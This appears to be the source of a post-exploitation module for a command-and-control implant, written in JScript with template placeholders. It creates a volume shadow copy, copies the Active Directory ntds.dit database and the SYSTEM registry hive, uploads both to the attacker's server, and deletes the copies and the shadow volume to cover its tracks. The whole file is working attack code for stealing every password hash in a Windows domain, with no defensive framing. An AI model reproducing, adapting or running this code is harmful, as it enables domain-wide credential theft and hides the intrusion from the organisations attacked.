try {
    var ntds_path = proton.file.getPath("~RPATH~\\~NTDSFILE~");
    var sysh_path = proton.file.getPath("~RPATH~\\~SYSHFILE~");

    // step 1. create and send .dit file, delete

    // todo: detect if shadow copy already available?

    var outp = proton.shell.exec("vssadmin create shadow /for=~DRIVE~", "~RPATH~\\~NTDSFILE~1.txt");

    var shadow = outp.split("Shadow Copy Volume Name: ")[1].split('\n')[0];
    var shadowid = outp.split("Shadow Copy ID: ")[1].split('\n')[0];

    //proton.shell.run("copy " + shadow + "\\windows\\ntds\\ntds.dit " + ntds_path, false);
    var unused = proton.shell.exec("copy " + shadow + "\\windows\\ntds\\ntds.dit " + ntds_path, "~RPATH~\\~NTDSFILE~2.txt");
    proton.http.upload(ntds_path, "~NTDSFILE~", ~CERTUTIL~, "~UUIDHEADER~");
    proton.file.deleteFile(ntds_path);

    // step 2. create, send SYSTEM hive, delete
    proton.shell.run("reg save HKLM\\SYSTEM " + sysh_path + " /y", false);
    proton.http.upload(sysh_path, "~SYSHFILE~", ~CERTUTIL~, "~UUIDHEADER~");
    proton.file.deleteFile(sysh_path);
    var discard = proton.shell.exec("vssadmin delete shadows /shadow="+shadowid+" /quiet", "~RPATH~\\"+proton.uuid()+".txt");

    // step 3. general complete
    proton.work.report("Complete");
} catch (e) {
    proton.work.error(e);
}

proton.exit();
